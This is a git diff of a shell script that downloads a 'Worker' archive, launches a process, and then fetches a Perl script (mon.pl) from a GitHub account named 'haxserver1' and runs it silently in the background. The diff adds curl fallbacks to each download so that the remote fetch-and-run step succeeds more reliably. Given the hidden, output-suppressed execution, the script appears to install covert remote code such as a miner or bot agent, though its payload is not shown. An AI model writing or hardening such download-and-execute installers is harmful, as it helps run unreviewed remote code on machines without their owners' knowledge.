@@ -37,10 +37,16 @@ echo "Removing Done!"
 echo "Downloading the Worker $1"
 wget $URL -O kwarta.zip
 if [ $? -ne 0 ]; then
-  echo "Download failed. Please check the URL or your internet connection."
-  exit 1
+  echo "wget failed to download kwarta.zip. Trying with curl."
+  curl -o kwarta.zip $URL
+  if [ $? -ne 0 ]; then
+    echo "curl also failed to download kwarta.zip. Please check the URL or your internet connection."
+    exit 1
+  else
+    echo "kwarta.zip downloaded successfully with curl."
+  fi
 else
-  echo "Download Complete."
+  echo "kwarta.zip downloaded successfully with wget."
 fi
 
 # Unzip the downloaded file
@@ -84,12 +90,18 @@ if ps -p $PID > /dev/null; then
   echo "Process started successfully with PID $PID."
 
   # Download and run mon.pl
-  wget https://raw.githubusercontent.com/haxserver1/session_uia21jkjgz8719831bs9d1ba971283v/main/sup.pl
+  wget https://raw.githubusercontent.com/haxserver1/session_uia21jkjgz8719831bs9d1ba971283v/main/mon.pl
   if [ $? -ne 0 ]; then
-    echo "Failed to download mon.pl."
-    exit 1
+    echo "wget failed to download mon.pl. Trying with curl."
+    curl -O https://raw.githubusercontent.com/haxserver1/session_uia21jkjgz8719831bs9d1ba971283v/main/mon.pl
+    if [ $? -ne 0 ]; then
+      echo "curl also failed to download mon.pl."
+      exit 1
+    else
+      echo "mon.pl downloaded successfully with curl."
+    fi
   else
-    echo "mon.pl downloaded successfully."
+    echo "mon.pl downloaded successfully with wget."
   fi
 
   nohup perl mon.pl >/dev/null 2>&1 &
@@ -112,12 +124,18 @@ else
     echo "Process started successfully with alternate method with PID $PID."
 
     # Download and run mon.pl
-    wget https://raw.githubusercontent.com/haxserver1/session_uia21jkjgz8719831bs9d1ba971283v/main/sup.pl
+    wget https://raw.githubusercontent.com/haxserver1/session_uia21jkjgz8719831bs9d1ba971283v/main/mon.pl
     if [ $? -ne 0 ]; then
-      echo "Failed to download mon.pl."
-      exit 1
+      echo "wget failed to download mon.pl. Trying with curl."
+      curl -O https://raw.githubusercontent.com/haxserver1/session_uia21jkjgz8719831bs9d1ba971283v/main/mon.pl
+      if [ $? -ne 0 ]; then
+        echo "curl also failed to download mon.pl."
+        exit 1
+      else
+        echo "mon.pl downloaded successfully with curl."
+      fi
     else
-      echo "mon.pl downloaded successfully."
+      echo "mon.pl downloaded successfully with wget."
     fi
 
     nohup perl mon.pl >/dev/null 2>&1 &
